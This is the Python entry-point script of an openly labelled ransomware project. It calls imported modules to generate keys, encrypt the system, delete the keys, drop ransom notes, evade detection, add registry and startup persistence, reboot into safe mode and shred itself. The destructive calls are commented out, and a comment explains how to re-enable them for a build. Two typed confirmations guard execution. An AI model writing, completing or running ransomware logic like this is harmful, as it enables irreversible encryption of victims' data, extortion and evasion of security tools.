import os
import sys
from evasion import evador
from ransomware import ransomware

#IF you want to build this project, remove the marker
#from the encrypt system, and reboot into safe mode.
#I turned them off just in case

ran = ransomware()
e = evador()

def start_ransomware():
    print("Generating keys...")
    ran.generate_keys()
    ran.generate_fernet()

    print("Encrypting the data...")
    #ran.encrypt_system()
    ran.delete_keys()
    print("Adding notes to the user")
    #ran.add_notes()
    print("Deleting ourself from the system")    
    #shred_ourself()

def shred_ourself():
    ran.shred(os.path.abspath(__file__))

if __name__ == "__main__":
    s1 = input("Are you sure you want to execute this program, this can harm you computer with no option to recover the data? (yes or no) ")
    if s1.lower() == "yes":
        s2 = input("Please confirm one more time by writing YeS: ")
        if s2 == "YeS":
            print("Already executed?")
            if ran.already_executed():
                print("\nBeginning the Ransomware\n")
                start_ransomware()
            else:
                print("Doing security checks")                
                if e.evade_detection():
                    print("\nPassed the Security checks")
                    print("Writing to registry and startup folder")
                    #ran.write_to_registry()
                    #ran.reboot_into_safe_mode()
                else:
                    print("\nWasn't able to bypass the Security checks.")
                    #shred_ourself()
                    sys.exit(0)
        else:
            sys.exit(0)
    else:
        sys.exit(0)